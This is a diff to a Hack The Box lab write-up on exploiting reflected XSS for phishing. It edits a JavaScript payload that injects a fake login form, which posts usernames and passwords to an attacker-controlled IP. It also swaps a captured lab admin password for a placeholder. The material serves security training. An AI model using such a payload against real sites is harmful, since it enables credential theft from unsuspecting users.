@@ -49,7 +49,7 @@ Exploit the XSS vulnerability at `http://10.129.9.211/phishing/index.php?url=` t
 
 #### Raw Payload:
 ```javascript
-'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.179><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
+'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.179><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
 ```
 
 #### URL Encoded Payload:
@@ -103,7 +103,7 @@ HTB bot visits, submits credentials, and they're logged.
 ### Step 5: Login and Get the Flag
 - URL: `http://10.129.9.211/phishing/login.php`
 - Username: `admin`
-- Password: `p1zd0nt57341myp455`
+- Password: `happyhacking`
 - Result: HTB{...}
 
 ---
@@ -135,8 +135,7 @@ rm /tmp/index.php /tmp/creds.txt
 
 ### Outcome
 
-- Captured: `admin / p1zd0nt57341myp455`
+- Captured: `admin / (not giving because of HTB policy)`
 - Flag: Successfully retrieved.
-- Credit: Grok (xAI) for assist
 
 Happy hacking!
